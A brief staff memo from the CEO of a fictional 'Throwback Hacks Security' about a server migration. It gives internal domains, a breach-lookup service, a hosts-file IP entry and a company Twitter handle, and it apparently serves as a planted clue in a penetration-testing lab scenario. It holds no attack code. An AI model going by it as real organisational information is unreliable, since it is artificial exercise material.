Hey team! Happy Thursday!

Not much on the schedule for this week, we are continuing our transition to our new
servers please be patient with us as we make this transition.

In order to access your usual resources please go to mail.corporate.local where you will
find our new emailing service, as well as breachgtfo.local where you will find our
proprierty breach service that all of you are already used to.
If you have not already please add 10.200.x.232 to your hosts file in order to access these resources.

As we are auditing our infrastructure please remeber that no personal social media
accounts should be connected to company resources such as github. If you need to use twitter to make company announcments
please use the @tbhSecurity twitter.

Please remain patient during this transition and dont be afraid to email me or any of the
other team members with questions

Summers Winters,
CEO of Throwback Hacks Security
